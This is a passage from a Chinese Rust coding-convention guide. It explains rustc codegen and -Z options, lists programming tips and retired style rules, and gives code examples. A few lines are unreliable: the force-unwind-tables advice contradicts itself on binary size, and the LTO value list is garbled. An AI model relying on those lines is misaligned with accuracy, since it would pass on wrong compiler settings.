<p>一般情况下，如果设置 <code>force-frame-pointers=no</code> 是一种帧指针省略优化。它造成的弊大于利，默认情况下不应启用。</p>
<h4 id="force-unwind-tables-优化编译大小"><a class="header" href="#force-unwind-tables-优化编译大小"><code>force-unwind-tables</code> （优化：编译大小）</a></h4>
<p><code>force-unwind-tables=val</code>，强制生成 unwind 表。它采用以下值之一：</p>
<ul>
<li><code>y</code>, <code>yes</code>, <code>on</code>, 或无值：强制生成 unwind 表。</li>
<li><code>n</code>, <code>no</code>, or <code>off</code>: 不强制生成 unwind 表。如果目标需要 unwind 表，则会发出错误。</li>
</ul>
<p>如果未指定，则默认值取决于 target 。</p>
<p>打开 <code>force-unwind-tables=on</code> 可能会导致二进制编译大小膨胀，对于移动和嵌入式这种二进制大小很重要的场景下，建议启用该选项。</p>
<h4 id="incremental优化编译时间"><a class="header" href="#incremental优化编译时间"><code>incremental</code>（优化：编译时间）</a></h4>
<p><code>incremental=val</code> ，用于启用增量编译。</p>
<h4 id="inline-threshold-优化性能"><a class="header" href="#inline-threshold-优化性能"><code>inline-threshold</code> （优化：性能）</a></h4>
<p><code>inline-threshold=val</code>， 允许您设置内联函数的默认阈值。它接受一个无符号整数作为值。内联基于成本模型（cost model），其中较高的阈值将允许更多内联。</p>
<p>默认值取决于<a href="https://doc.rust-lang.org/rustc/codegen-options/index.html#opt-level">opt-level</a>：</p>
<table><thead><tr><th>选择级别</th><th>临界点</th></tr></thead><tbody>
<tr><td>0</td><td>不适用，仅内联始终内联函数</td></tr>
<tr><td>1</td><td>不适用，仅内联始终内联函数和 LLVM 生命周期内在函数</td></tr>
<tr><td>2</td><td>225</td></tr>
<tr><td>3</td><td>275</td></tr>
<tr><td>s</td><td>75</td></tr>
<tr><td>z</td><td>25</td></tr>
</tbody></table>
<h4 id="链接相关参数"><a class="header" href="#链接相关参数">链接相关参数</a></h4>
<ul>
<li><code>link-arg=val</code>，将单个额外参数附加到链接器调用。</li>
<li><code>link-args=val</code>，将多个额外参数附加到链接器调用。选项应该用空格分隔。</li>
<li><code>link-dead-code=val</code>，控制链接器是否保留死代码，尝试构建代码覆盖率指标时，此标志可能有用。它采用以下值之一：
<ul>
<li><code>y</code>, <code>yes</code>, <code>on</code>, 或无值：保留死代码。</li>
<li><code>n</code>, <code>no</code>, or <code>off</code>: 删除死代码（默认）。</li>
</ul>
</li>
<li><code> link-self-contained=val</code>，控制链接器是使用 Rust 附带的库和对象还是系统中的库和对象。</li>
<li><code>linker=val </code>，控制链接器<code>rustc</code>调用哪个链接器来链接您的代码。它采用链接器可执行文件的路径。如果未指定此标志，则将根据目标推断链接器。选择特定的链接器，有助于<strong>优化编译时间</strong>。</li>
<li><code>linker-flavor=val</code>，链接器带有<a href="https://doc.rust-lang.org/rustc/codegen-options/index.html#linker"><code>-C linker</code>标志</a>，则链接器风格是从提供的值中推断出来的。如果没有给出链接器，则使用链接器风格来确定要使用的链接器。每个<code>rustc</code>目标都默认为某种链接器风格。选项参考:<a href="https://doc.rust-lang.org/rustc/codegen-options/index.html#linker-flavor">linker-flavor</a> 。</li>
<li><code>linker-plugin-lto=val</code>，允许将 LTO 优化推迟到实际的链接步骤，如果所有被链接的目标文件都是由基于 LLVM 的工具链创建的，那么这反过来又允许跨编程语言边界执行过程间<strong>优化</strong>。详细介绍参见<a href="https://doc.rust-lang.org/rustc/linker-plugin-lto.html">Linker-plugin-LTO</a>。它采用以下值之一：
<ul>
<li><code>y</code>, <code>yes</code>, <code>on</code>, 或无值：启用链接器插件 LTO。</li>
<li><code>n</code>, <code>no</code>, or <code>off</code>: 禁用链接器插件 LTO（默认）。</li>
<li>链接器插件的路径。</li>
</ul>
</li>
</ul>
<h4 id="lto-优化性能"><a class="header" href="#lto-优化性能"><code>lto</code> （优化：性能）</a></h4>
<p><code>lto=val</code>，这个标志控制LLVM是否使用链接时优化（link-time optimizations），以产生更好的优化代码，使用整个程序分析，代价是延长链接时间，所以，会减慢编译时间。它取以下值之一：</p>
<ul>
<li><code>y</code>, <code>yes</code>,<code> on</code>,<code> fat</code>, or <code>no</code>值：执行 &quot;fat &quot;LTO，试图在依赖图中的所有crate中进行优化。</li>
<li><code>n</code>,<code> no</code>,<code> of</code>f: 禁用LTO。</li>
<li><code>thin</code>：执行 &quot;Thin &quot;LTO。这与 &quot;fat &quot;类似，但运行时间大大减少，同时仍能实现与 &quot;fat &quot;类似的性能提升。</li>
</ul>
<p>如果没有指定<code>-C lto</code>，那么编译器将尝试执行 &quot;thin local LTO&quot;，它只在本地的crate上对其代码单元执行 &quot;thin &quot;LTO。当没有指定<code>-C lto</code>时，如果代码单元是<code>1</code>或者优化被禁用（<code>-C opt-level=0</code>），LTO将被禁用。</p>
<p>即：</p>
<ul>
<li>当没有指定<code>-C lto</code>时:
<ul>
<li><code>codegen-units=1</code>: 禁用LTO</li>
<li><code>opt-level=0</code>: 禁用LTO。</li>
</ul>
</li>
<li>当<code>-C lto</code>被指定时：
<ul>
<li><code>lto</code>：16个代码生成单元，在整个crate 中执行 fat LTO。</li>
<li><code>codegen-units=1</code> +<code> lto</code>:  <code>1</code>个编码生成单元，跨 crate 进行fat LTO。</li>
</ul>
</li>
</ul>
<p>跨语言的LTO 参见<a href="https://doc.rust-lang.org/rustc/linker-plugin-lto.html">Linker-plugin-LTO</a> 。</p>
<h4 id="passes-优化性能"><a class="header" href="#passes-优化性能"><code>passes</code> （优化：性能）</a></h4>
<p><code>passes=val</code>，设置额外的 LLVM passes 列表，使用空格分隔。</p>
<blockquote>
<p>LLVM Pass 是LLVM代码优化（optimization）中的一个重要组成部分。为便于理解，可以将Pass看作一个又一个的模块，各个Pass可以通过IR获取信息为下一个Pass做好准备，又或者直接对中间代码进行优化。</p>
<p>总的来说，所有的pass大致可以分为两类：</p>
<ul>
<li>分析(<code>analysis</code>)和转换分析类的pass以提供信息为主</li>
<li>转换类(<code>transform</code>)的pass优化中间代码</li>
</ul>
<p>详细参考：<a href="https://kiprey.github.io/2020/06/LLVM-IR-pass/">代码优化与LLVM IR pass</a></p>
</blockquote>
<p>相关选项：<code>no-prepopulate-passes=val</code>，使用空的 Pass 列表。</p>
<h4 id="no-redzone"><a class="header" href="#no-redzone"><code>no-redzone</code></a></h4>
<p><code>no-redzone=val</code>，允许禁用<a href="https://en.wikipedia.org/wiki/Red_zone_(computing)">红区</a>。它采用以下值之一：</p>
<ul>
<li><code>y</code>, <code>yes</code>, <code>on</code>, 或无值：禁用红色区域。</li>
<li><code>n</code>, <code>no</code>, 或<code>off</code>: 启用红色区域。</li>
</ul>
<blockquote>
<p><strong>红区</strong>（redzone）是System V ABI提供的一种优化的产物，它允许函数无需调整<strong>栈指针</strong>（stack pointer），便能临时使用其<strong>栈帧</strong>（stack frame）下方的128个字节。红区被定义为调整过的栈指针下方128个字节的区域——函数将会使用这个区域，来存放一些无需跨越函数调用的临时数据。因此，在一些情况下，比如在小的<strong>叶函数</strong>（leaf function）[1]中，我们可以优化掉调整栈指针所需的两条指令。(</p>
<p><strong>叶函数</strong>（leaf function）指的是不调用其它函数的函数；可以理解为，是函数调用图的叶子节点。特别地，<strong>尾递归函数</strong>（tail recursive function）的尾部可以看作是叶函数。</p>
<p>然而，当<strong>异常</strong>（exception）或<strong>硬件中断</strong>（hardware interrupt）发生时，这种优化却可能产生严重的问题。</p>
<p>参考：<a href="https://github.com/rustcc/writing-an-os-in-rust/blob/master/appendix-b-red-zone.md">使用Rust编写操作系统（附录二）：禁用红区</a></p>
</blockquote>
<h4 id="no-vectorize-loops-优化性能"><a class="header" href="#no-vectorize-loops-优化性能"><code>no-vectorize-loops</code> （优化：性能）</a></h4>
<p><code>no-vectorize-loops=val</code>，禁用循环矢量化（loop vectorization optimization passes）。等价于 Clang 的 <code>-fno-vectorize</code>。</p>
<p>LLVM Loop Vectorizer 具有许多功能，可以对复杂的循环进行矢量化（向量化即“批量操作”，数据并行）。循环矢量化器使用成本模型来决定最佳矢量化因子和展开因子。但是，矢量化器的用户可以强制矢量化器使用特定值。许多循环无法向量化，包括具有复杂控制流、不可向量化类型和不可向量化调用的循环。对于更复杂的情况，我们则需要手动进行SIMD编程。</p>
<p>是否禁用，取决于你的使用场景。</p>
<p>相关：<code>no-vectorize-slp=val</code>，禁用 SLP 向量化。</p>
<h4 id="overflow-checks-安全"><a class="header" href="#overflow-checks-安全"><code> overflow-checks</code> （安全）</a></h4>
<p><code>overflow-checks=val</code>，控制<a href="https://doc.rust-lang.org/reference/expressions/operator-expr.html#overflow">运行时整数溢出检查</a>，启用溢出检查时，溢出时会发生恐慌。取值为：</p>
<p>采用以下值之一：</p>
<ul>
<li><code>y</code>, <code>yes</code>, <code>on</code>, 或无值：启用溢出检查。</li>
<li><code>n</code>, <code>no</code>, or <code>off</code>: 禁用溢出检查。</li>
</ul>
<p>如果未指定，则在启用 <a href="https://doc.rust-lang.org/rustc/codegen-options/index.html#debug-assertions">调试断言</a>时启用溢出检查，否则禁用。</p>
<h4 id="panic"><a class="header" href="#panic"><code>panic</code></a></h4>
<p>控制代码恐慌时发生的情况:</p>
<ul>
<li><code>abort</code>: 恐慌时终止进程，不能执行析构函数。</li>
<li><code>unwind</code>: 恐慌时展开堆栈，可以执行析构函数，以及 catch_unwind 。</li>
</ul>
<p>如果未指定，则默认值取决于目标。</p>
<h4 id="prefer-dynamic"><a class="header" href="#prefer-dynamic"><code> prefer-dynamic</code></a></h4>
<p><code> prefer-dynamic=val</code>，默认情况下，<code>rustc</code>更喜欢静态链接依赖项。如果库的静态和动态版本都可用，此选项将指示应尽可能使用动态链接。有一个内部算法用于确定是否可以静态或动态地与依赖项链接。例如，<code>cdylib</code> crate类型可能只使用静态链接。此标志采用以下值之一：</p>
<ul>
<li><code>y</code>, <code>yes</code>, <code>on</code>, 或无值：使用动态链接。</li>
<li><code>n</code>, <code>no</code>, or <code>off</code>: 使用静态链接（默认）。</li>
</ul>
<h4 id="profile-generate-优化"><a class="header" href="#profile-generate-优化"><code>profile-generate</code> （优化）</a></h4>
<p><code>profile-generate=val</code>，允许创建检测二进制文件，这些二进制文件将收集分析数据以用于 Profile Guided Optimization (PGO)。该Flag 采用一个可选参数，该参数是已检测二进制文件将向其中发出收集的数据的目录的路径。有关详细信息，请参阅 <a href="https://doc.rust-lang.org/rustc/profile-guided-optimization.html">profile-guided optimization</a> 。</p>
<p>相关：<code>profile-use=val</code>。</p>
<h4 id="split-debuginfo-调试"><a class="header" href="#split-debuginfo-调试"><code>split-debuginfo</code> （调试）</a></h4>
<p><code>split-debuginfo=val </code>，控制<code>rustc</code>生成的调试信息的“split debuginfo”的发射。此选项的默认行为是特定于平台的，并非此选项的所有可能值都适用于所有平台。可能的值为：</p>
<ul>
<li><code>off</code>- 这是具有 ELF 二进制文件和 windows-gnu（不是 Windows MSVC 和 macOS）的平台的默认设置。这通常意味着可以在可执行文件部分的最终工件中找到 DWARF 调试信息。Windows MSVC 不支持此选项。在 macOS 上，此选项可防止最终执行<code>dsymutil</code>生成调试信息。</li>
<li><code>packed</code>- 这是 Windows MSVC 和 macOS 的默认设置。这里的“packed”一词意味着所有调试信息都打包到与主可执行文件不同的文件中。在 Windows MSVC 上这是一个<code>*.pdb</code>文件，在 macOS 上这是一个<code>*.dSYM</code>文件夹，而在其他平台上这是一个<code>*.dwp</code> 文件。</li>
<li><code>unpacked</code>- 这意味着调试信息将在每个编译单元（目标文件）的单独文件中找到。Windows MSVC 不支持此功能。在 macOS 上，这意味着原始目标文件将包含调试信息。在其他 Unix 平台上，这意味着<code>*.dwo</code>文件将包含调试信息。</li>
</ul>
<p>请注意，此时<code>packed</code>和<code>unpacked</code>在<code>-Z unstable-options</code>非 macOS 平台上被关闭。</p>
<h4 id="strip-优化编译大小"><a class="header" href="#strip-优化编译大小"><code>strip</code> （优化：编译大小）</a></h4>
<p><code>strip=val</code>，控制在链接期间从二进制文件中剥离调试信息和类似的辅助数据。可用于减少编译文件大小。</p>
<p>此选项支持的值为：</p>
<ul>
<li><code>none</code>- 根据目标将调试信息和符号（如果存在）复制到生成的二进制文件或单独的文件中（例如<code>.pdb</code>，MSVC 中的文件）。</li>
<li><code>debuginfo</code> - debuginfo 部分和符号表部分中的 debuginfo 符号在链接时被剥离，并且不会复制到生成的二进制文件或单独的文件中。</li>
<li><code>symbols</code>- 与 相同<code>debuginfo</code>，但如果链接器支持，符号表部分的其余部分也会被剥离。</li>
</ul>
<h3 id="-z"><a class="header" href="#-z"><code>-Z</code></a></h3>
<p><code>-Z</code> Flag 只允许在 Nightly Rust 下使用，因为它包含了 未稳定的编译器选项。</p>
<p>在该 Flag 下面有许多未稳定的子参数，这里就不一一列举。只挑选几个和安全相关的展示一下：</p>
<ul>
<li><code>stack-protector=val</code> ，用于控制栈粉碎保护策略，用于缓冲溢出保护。通过命令 <code>rustc --print stack-protector-strategies</code>可以看到详细设置值。</li>
<li><code>sanitizer=val</code>，sanitizers（CFI 除外）的实现几乎完全依赖于 LLVM，将来增加 GCC 后端应该可以多一些支持。用于支持 内存错误检测器（<a href="https://clang.llvm.org/docs/AddressSanitizer.html">AddressSanitizer</a>）、LLVM 控制流完整性 (CFI) 提供前沿控制流保护（<a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">ControlFlowIntegrity</a> ）、运行时内存泄漏检测器（<a href="https://clang.llvm.org/docs/LeakSanitizer.html">LeakSanitizer</a>）、未初始化读取的检测器（<a href="https://clang.llvm.org/docs/MemorySanitizer.html">MemorySanitizer</a>）、数据竞争检测器（<a href="https://clang.llvm.org/docs/ThreadSanitizer.html">ThreadSanitizer</a>）等。</li>
</ul>
<h2 id="参考-3"><a class="header" href="#参考-3">参考</a></h2>
<p>https://doc.rust-lang.org/rustc/command-line-arguments.html</p>
<p>https://doc.rust-lang.org/rustc/codegen-options/index.html</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="i最佳实践"><a class="header" href="#i最佳实践">I.最佳实践</a></h1>
<h2 id="列表-10"><a class="header" href="#列表-10">列表</a></h2>
<ul>
<li><a href="safe-guides/Appendix/best-practice/./qa.html">Q&amp;A</a></li>
<li><a href="safe-guides/Appendix/best-practice/./tips.html">Tips</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="初学者常见问题qa"><a class="header" href="#初学者常见问题qa">初学者常见问题Q&amp;A</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rust-编程技巧"><a class="header" href="#rust-编程技巧">Rust 编程技巧</a></h1>
<h3 id="设计模式之构建者模式"><a class="header" href="#设计模式之构建者模式">设计模式之构建者模式</a></h3>
<p>当需要很多构造函数，或构造含有很多可选配置项时，宜使用构建者模式</p>
<p><strong>【描述】</strong></p>
<p>Rust 中没有默认的构造函数，都是自定义构造函数。</p>
<p>如果需要多个构造函数，或者构造时需要很多可选配置的复杂场景，那么构建者模式是适合你的选择。</p>
<p><strong>【示例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[derive(Debug, PartialEq)]
pub struct Foo {
    // Lots of complicated fields.
    bar: String,
}

impl Foo {
    // This method will help users to discover the builder
    pub fn builder() -&gt; FooBuilder {
        FooBuilder::default()
    }
}

#[derive(Default)]
pub struct FooBuilder {
    // Probably lots of optional fields.
    bar: String,
}

impl FooBuilder {
    pub fn new(/* ... */) -&gt; FooBuilder {
        // Set the minimally required fields of Foo.
        FooBuilder {
            bar: String::from(&quot;X&quot;),
        }
    }

    pub fn name(mut self, bar: String) -&gt; FooBuilder {
        // Set the name on the builder itself, and return the builder by value.
        self.bar = bar;
        self
    }

    // If we can get away with not consuming the Builder here, that is an
    // advantage. It means we can use the FooBuilder as a template for constructing
    // many Foos.
    pub fn build(self) -&gt; Foo {
        // Create a Foo from the FooBuilder, applying all settings in FooBuilder
        // to Foo.
        Foo { bar: self.bar }
    }
}

#[test]
fn builder_test() {
    let foo = Foo {
        bar: String::from(&quot;Y&quot;),
    };
    let foo_from_builder: Foo = FooBuilder::new().name(String::from(&quot;Y&quot;)).build();
    assert_eq!(foo, foo_from_builder);
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="善用标准库中提供的迭代器适配器方法来满足自己的需求"><a class="header" href="#善用标准库中提供的迭代器适配器方法来满足自己的需求">善用标准库中提供的迭代器适配器方法来满足自己的需求</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 标准库中提供了很多迭代器方法，要学会使用它们，选择合适的方法来满足自己的需求。</p>
<p>下面示例中，反例中的迭代器适配器方法，都可以用对应的正例中的方法代替。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// explicit_counter_loop
let v = vec![1];
fn bar(bar: usize, baz: usize) {}
let mut i = 0;
for item in &amp;v {
    bar(i, *item);
    i += 1;
}

// filter_map_identity
let iter = vec![Some(1)].into_iter();
iter.filter_map(|x| x);

// filter_next
let vec = vec![1];
vec.iter().filter(|x| **x == 0).next();

// flat_map_identity
let iter = vec![vec![0]].into_iter();
iter.flat_map(|x| x);

// flat_map_option
let nums: Vec&lt;i32&gt; = [&quot;1&quot;, &quot;2&quot;, &quot;whee!&quot;].iter().flat_map(|x| x.parse().ok()).collect();
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// explicit_counter_loop
let v = vec![1];
fn bar(bar: usize, baz: usize) {}
for (i, item) in v.iter().enumerate() { bar(i, *item); }

// filter_map_identity
let iter = vec![Some(1)].into_iter();
iter.flatten();

// filter_next
let vec = vec![1];
vec.iter().find(|x| **x == 0);

// flat_map_identity
let iter = vec![vec![0]].into_iter();
iter.flatten();

// flat_map_option
let nums: Vec&lt;i32&gt; = [&quot;1&quot;, &quot;2&quot;, &quot;whee!&quot;].iter().filter_map(|x| x.parse().ok()).collect();

<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#explicit_counter_loop">explicit_counter_loop</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#filter_map_identity">filter_map_identity</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#filter_next">filter_next</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#flat_map_identity">flat_map_identity</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#flat_map_option">flat_map_option</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<h2 id="可以使用cowstr来代替直接使用字符串它可以减少copy"><a class="header" href="#可以使用cowstr来代替直接使用字符串它可以减少copy">可以使用<code>Cow&lt;str&gt;</code>来代替直接使用字符串，它可以减少Copy</a></h2>
<p><strong>【描述】</strong></p>
<p>使用 <code>Cow&lt;str&gt;</code> 作为字符串处理函数参数和返回值，可以尽可能地减少数据Copy 和 内存分配。当字符串没有修改的时候，实际使用的是 <code>&amp;'a str</code>，只有当数据修改的时候才会使用<code>String</code>。对于读操作大于写操作的场景，使用 <code>Cow&lt;str&gt;</code> 比较合适。</p>
<p><strong>【示例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 对输入的字符串进行转义
pub fn naive&lt;'a, S: Into&lt;Cow&lt;'a, str&gt;&gt;&gt;(input: S) -&gt; Cow&lt;'a, str&gt; {
    let input = input.into();
    fn is_trouble(c: char) -&gt; bool {
        c == '&lt;' || c == '&gt;' || c == '&amp;'
    }

    if input.contains(is_trouble) {
        let mut output = String::with_capacity(input.len());
        for c in input.chars() {
            match c {
                '&lt;' =&gt; output.push_str(&quot;&amp;lt;&quot;),
                '&gt;' =&gt; output.push_str(&quot;&amp;gt;&quot;),
                '&amp;' =&gt; output.push_str(&quot;&amp;amp;&quot;),
                _ =&gt; output.push(c)
            }
        }
        // 只有在字符串修改的时候才使用 String
        Cow::Owned(output)
    } else {
        //其他情况使用 &amp;str
        input
    }
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="错误处理根据应用还是库来选择不同的错误处理方式"><a class="header" href="#错误处理根据应用还是库来选择不同的错误处理方式">错误处理：根据应用还是库来选择不同的错误处理方式</a></h2>
<p><strong>【描述】</strong></p>
<p>如果编写应用，建议使用<code> Error</code> trait对象；如果编写库，则建议返回自定义错误类型，方便下游处理</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 对于应用使用 Error trait 对象更加方便
pub fn print(&amp;self, languages: &amp;Languages) -&gt; Result&lt;String, Box&lt;dyn Error&gt;&gt; {
     // do something
}

// 对于库，暴露自定义错误类型更加方便下游处理错误
#[derive(Debug)]
pub struct SendError&lt;T&gt;(pub T);

impl&lt;T&gt; fmt::Display for SendError&lt;T&gt; {
    fn fmt(&amp;self, fmt: &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {
        write!(fmt, &quot;channel closed&quot;)
    }
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="嵌入式no-std-将一些公用的类型函数宏等集中到一个自定义的-baremetal-std"><a class="header" href="#嵌入式no-std-将一些公用的类型函数宏等集中到一个自定义的-baremetal-std">嵌入式（no-std）: 将一些公用的类型、函数、宏等集中到一个自定义的 <code>baremetal-std</code></a></h2>
<p><strong>【描述】</strong></p>
<p>虽然 <code>no-std</code> 下不能用Rust 的标准库，但是可以自定义 <code>no-std</code> 下的标准库 <code>baremetal-std</code>，用于积累 <code>no-std</code> 下常用的公共库。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="j贡献说明"><a class="header" href="#j贡献说明">J.贡献说明</a></h1>
<p>欢迎直接提交 Issues 或 PR 直接参与评审和完善（包括精简、增补新的规则）编码规范。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="k淘汰的规则"><a class="header" href="#k淘汰的规则">K.淘汰的规则</a></h1>
<hr />
<h2 id="常量"><a class="header" href="#常量">常量</a></h2>
<h3 id="gcns03-不宜将量大的数据结构定义为常量"><a class="header" href="#gcns03-不宜将量大的数据结构定义为常量">G.CNS.03 不宜将量大的数据结构定义为常量</a></h3>
<p><strong>淘汰原因</strong></p>
<p>虽然常量本质上是会内联，但Rust 支持类似于复制消除（Copy Elision）的优化（非强制），而且在不断改进中，对于这种大的数据应该会有相关优化。这里建议用静态变量来代替常量，也许会引入使用的复杂性，所以这条规则被淘汰。只保留对固定长度数组相关的规则。</p>
<p>相应修改：[G.TYP.ARR.01] 的描述也有相对修改。</p>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>因为<a href="https://doc.rust-lang.org/reference/items/constant-items.html#constant-items">常量会到处内联</a>，即复制到各个使用到它的地方。而静态变量不会内联，它是全局的且有一个引用地址。
所以当要创建一个很大的常量数组时，应该考虑将其换成静态变量以提高程序运行效率。（详情可见：<a href="https://rust-lang.github.io/rfcs/0246-const-vs-static.html#motivation">const-vs-static</a>）</p>
<p>相关：[G.TYP.Array.01 ]</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    const MONTHS: [&amp;str; 12] = [&quot;January&quot;, &quot;Feburary&quot;, &quot;March&quot;, &quot;April&quot;,
                                &quot;May&quot;, &quot;June&quot;, &quot;July&quot;, &quot;August&quot;,
                                &quot;September&quot;, &quot;October&quot;, &quot;November&quot;, &quot;December&quot;];
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    static MONTHS: [&amp;str; 12] = [&quot;January&quot;, &quot;Feburary&quot;, &quot;March&quot;, &quot;April&quot;,
                                &quot;May&quot;, &quot;June&quot;, &quot;July&quot;, &quot;August&quot;,
                                &quot;September&quot;, &quot;October&quot;, &quot;November&quot;, &quot;December&quot;];
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>是否可定制</th></tr></thead><tbody>
<tr><td>_</td><td>no</td><td>no</td><td>_</td><td>yes</td></tr>
</tbody></table>
<p><strong>【定制化参考】</strong></p>
<p>这条规则如果需要定制Lint，则需要找出每个定义的常量再判断其空间占用，或可直接排除基础类型以外的数据类型。</p>
<h2 id="变量"><a class="header" href="#变量">变量</a></h2>
<h3 id="pvar02--禁止将局部变量的引用返回函数外"><a class="header" href="#pvar02--禁止将局部变量的引用返回函数外">P.VAR.02  禁止将局部变量的引用返回函数外</a></h3>
<p><strong>淘汰原因</strong></p>
<p>Rust 编译器可以检测到这种情况，之前考虑到编译器错误比较晦涩，列出该规则，但是进一步考虑到这个应该是 Rust 开发者最基本的认知，顾淘汰此规则。</p>
<p><strong>【描述】</strong></p>
<p>局部变量生命周期始于其声明终于其作用域结束。如果在其生命周期之外被引用，则程序的行为是未定义的。当然，Rust 编译器也会阻止你这么干。</p>
<p>*注： Rust 编译器可以检测到这种情况，但是编译器错误比较晦涩，本原则用来提示开发者注意这种情况。 *</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn makestr() -&gt; &amp;String {
    let a = &quot;test&quot;.to_string();
    &amp;a
}

pub fn main() {
    let a = makestr();
}
</code></pre></pre>
<h3 id="gvar01--交换两个变量的值应使用-swap-而非赋值"><a class="header" href="#gvar01--交换两个变量的值应使用-swap-而非赋值">G.VAR.01  交换两个变量的值应使用 <code>swap</code> 而非赋值</a></h3>
<p><strong>淘汰原因</strong></p>
<p>该条规则属于教程向，这应该是 Rust 开发者的基本认知。也不应该引导开发者使用swap。</p>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>对于包含 <code>swap</code> 方法的类型，如 <code>ptr</code>、<code>slice</code>、<code>Cell</code>、<code>RefCell</code>、<code>VecDeque</code> 等建议使用该类型的 <code>swap</code> 方法进行交换。</p>
<p>对其他类型可以使用函数 <code>std::mem::swap</code> 进行变量值的交换。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut a = 1;
let mut b = 2;
let mut c = 0; // 辅助交换的变量
c = a;
a = b;
b = c;  
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut a = 1;
let mut b = 2;
std::mem::swap(&amp;mut a, &amp;mut b);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>是否可定制</th></tr></thead><tbody>
<tr><td>_</td><td>no</td><td>no</td><td>_</td><td>yes</td></tr>
</tbody></table>
<p><strong>【定制化参考】</strong></p>
<p>这条规则如果需要定制Lint，则可以检测变量赋值操作，识别交换语义，推荐用户使用 <code>swap</code> 函数。</p>
<h2 id="数据类型"><a class="header" href="#数据类型">数据类型</a></h2>
<h3 id="ptyp01-类型转换要尽量使用安全的方式"><a class="header" href="#ptyp01-类型转换要尽量使用安全的方式">P.TYP.01 类型转换要尽量使用安全的方式</a></h3>
<p><strong>淘汰原因</strong></p>
<p>和 G.TYP.01 有点重复。</p>
<p><strong>【描述】</strong></p>
<p>Rust 中的类型转换有多种方式，其中 <code>as</code> 强转、Unsafe 的 <code>std::mem::transmute</code> 为不安全转换。<code>From/Into</code>安全转换函数为安全转换。在使用类型转换时，应优先使用安全转换方式。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 产生数据截断
let a = i32::MAX;
let b = a as u16; 
println!(&quot;{}, {}&quot;, a, b); // 2147483647, 65535

// 产生精度损失
let a = std::f64::consts::PI;
let b = a as f32; 
println!(&quot;{}, {}&quot;, a, b); // 3.141592653589793, 3.1415927

// 结果不正确
let a: f64 = 123456.0;
let b: i64 = unsafe {
std::mem::transmute(a)
};
println!(&quot;{}, {}&quot;, a, b); // 123456, 4683220244930494464
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let a: f32 = 123456.0; 
let b: f64 = a.try_into().expect(&quot;trans failed&quot;); 
println!(&quot;{}, {}&quot;, a, b); // 123456, 123456
<span class="boring">}
</span></code></pre></pre>
<h3 id="ptyp02--对数组和集合容器进行索引要使用-usize-类型"><a class="header" href="#ptyp02--对数组和集合容器进行索引要使用-usize-类型">P.TYP.02  对数组和集合容器进行索引要使用 <code>usize</code> 类型</a></h3>
<p><strong>淘汰原因</strong></p>
<p>这属于 Rust 开发者必备基本认知，有点偏教程向，故淘汰。</p>
<p><strong>【描述】</strong></p>
<p>Rust 中只允许索引为 <code>usize</code> 类型，因为：</p>
<ol>
<li>负索引是无意义的。</li>
<li><code>usize</code>和 裸指针大小相同，意味着指针算法不会有任何隐藏的强制转换</li>
<li><code>std::mem::size_of()</code> 和 <code>std::mem::align_of()</code> 的函数返回 <code>usize</code> 类型。</li>
